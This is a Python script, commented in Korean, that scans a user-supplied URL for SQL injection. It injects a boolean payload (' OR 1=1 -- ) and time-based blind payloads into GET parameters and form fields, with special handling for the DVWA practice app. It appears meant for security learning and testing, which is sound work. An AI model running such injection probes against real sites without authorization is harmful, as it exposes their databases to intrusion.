import requests, sys, time, requests.compat
from bs4 import BeautifulSoup

##### 모듈 임포트: 환경에 따라 상대/절대 경로 자동 선택 #####

try:
    from .sqli_config import TEST_PAYLOAD, TEST_PAYLOAD_TIME_BLIND, TIME_THRESHOLD
    from .sqli_dvwa_helper import (
        check_for_success_indicator, check_for_error_indicator,
        extract_url_info, setup_session
    )
except ImportError:
    from sqli_config import TEST_PAYLOAD, TEST_PAYLOAD_TIME_BLIND, TIME_THRESHOLD
    from sqli_dvwa_helper import (
        check_for_success_indicator, check_for_error_indicator,
        extract_url_info, setup_session
    )

##### 스캔 로직: GET 파라미터 #####

def scan_sql_injection_get_param(session, base_url, param):
    vulnerabilities = []
    success_payload = "' OR 1=1 -- "

    # 1. 성공/에러 기반 탐지
    attack_url = f"{base_url}?{param}=1{success_payload}"
    try:
        response = session.get(attack_url, timeout=5)
    except requests.exceptions.RequestException:
        return []

    success_indicator = check_for_success_indicator(response.text)
    error_indicator = check_for_error_indicator(response.text)

    if success_indicator:
        vulnerabilities.append({"type": "SQL Injection (Data Retrieval/Boolean)", "method": "GET",
                                "parameter": param, "details": f"성공 징후 '{success_indicator}' 발견"})
        return vulnerabilities

    if error_indicator:
        vulnerabilities.append({"type": "SQL Injection (Error Based)", "method": "GET",
                                "parameter": param, "details": f"에러 키워드 '{error_indicator}' 발견"})
        return vulnerabilities

    # 2. 시간 기반 블라인드 탐지
    attack_url_time = f"{base_url}?{param}=1{TEST_PAYLOAD_TIME_BLIND}"
    try:
        start_time = time.time()
        session.get(attack_url_time, timeout=10)
        elapsed_time = time.time() - start_time

        if elapsed_time > TIME_THRESHOLD:
            vulnerabilities.append({"type": "SQL Injection (Time Based)", "method": "GET",
                                    "parameter": param, "details": f"응답 시간 {elapsed_time:.2f}초 초과"})
    except (requests.exceptions.Timeout, requests.exceptions.RequestException):
        pass

    return vulnerabilities

##### 스캔 로직: Form 처리 #####

def scan_sql_injection_forms(session, url):
    vulnerabilities = []
    try:
        response = session.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
    except requests.exceptions.RequestException:
        return []

    for form in forms:
        method = form.get('method', 'GET').upper()
        form_url = requests.compat.urljoin(url, form.get('action', url))
        input_fields = form.find_all(['input', 'textarea', 'select'])
        param_names = [field.get('name') for field in input_fields if field.get('name')]

        if not param_names: continue

        for param in param_names:
            # 1. 에러 기반 탐지
            test_data_error = {p: f"1{TEST_PAYLOAD}" if p == param else "1" for p in param_names}
            try:
                res = session.post(form_url, data=test_data_error, timeout=5,
                                   allow_redirects=True) if method == 'POST' else \
                    session.get(form_url, params=test_data_error, timeout=5, allow_redirects=True)
            except requests.exceptions.RequestException:
                continue

            error_indicator = check_for_error_indicator(res.text)
            if error_indicator:
                vulnerabilities.append({"type": "SQL Injection (Error Based)", "method": method,
                                        "parameter": param, "details": f"에러 키워드 '{error_indicator}' 발견"})
                continue

            # 2. 시간 기반 블라인드 탐지
            test_data_time = {p: f"1{TEST_PAYLOAD_TIME_BLIND}" if p == param else "1" for p in param_names}
            try:
                start_time = time.time()
                (session.post(form_url, data=test_data_time, timeout=10, allow_redirects=True) if method == 'POST' else \
                     session.get(form_url, params=test_data_time, timeout=10, allow_redirects=True))
                elapsed_time = time.time() - start_time

                if elapsed_time > TIME_THRESHOLD:
                    vulnerabilities.append({"type": "SQL Injection (Time Based)", "method": method,
                                            "parameter": param, "details": f"응답 시간 {elapsed_time:.2f}초 초과"})
            except (requests.exceptions.Timeout, requests.exceptions.RequestException):
                pass

    return vulnerabilities


# =========================================================
# 메인 실행 함수
# =========================================================

def run_sql_scanner(session, full_url):
    all_vulnerabilities = []
    try:
        base_url, get_params_from_url = extract_url_info(full_url)
    except Exception:
        return all_vulnerabilities

    # DVWA 전용 로직
    if "dvwa" in full_url.lower() and "sqli" in full_url.lower():
        all_vulnerabilities.extend(scan_sql_injection_get_param(session, base_url, 'id'))

    # 1. GET 파라미터 스캔
    for param in get_params_from_url:
        all_vulnerabilities.extend(scan_sql_injection_get_param(session, base_url, param))

    # 2. 폼 필드 스캔
    all_vulnerabilities.extend(scan_sql_injection_forms(session, full_url))

    return all_vulnerabilities


def main():
    print("--- 🛡️ GET/POST 통합 SQLi 탐지 스캐너 ---")
    full_url = input("테스트할 전체 URL을 입력하세요 : ").strip()

    if not full_url.startswith('http'):
        print("[-] URL은 'http' 또는 'https'로 시작해야 합니다. 종료합니다.")
        sys.exit(1)

    session = setup_session(full_url)
    results = run_sql_scanner(session, full_url)

    if results:
        print(f"\n🚨🚨 **총 {len(results)}개의 SQL Injection 징후가 발견되었습니다.** 🚨🚨")
        for i, vuln in enumerate(results, 1):
            print(f"\n[{i}. 발견된 취약점]")
            print(f"  - 유형: {vuln.get('type', 'N/A')}")
            print(f"  - 방식: {vuln.get('method', 'N/A')}")
            print(f"  - 파라미터: {vuln.get('parameter', 'N/A')}")
            print(f"  - 상세: {vuln.get('details', 'N/A')}")
    else:
        print("\n🎉 취약점 징후가 발견되지 않았습니다.")


if __name__ == '__main__':
    main()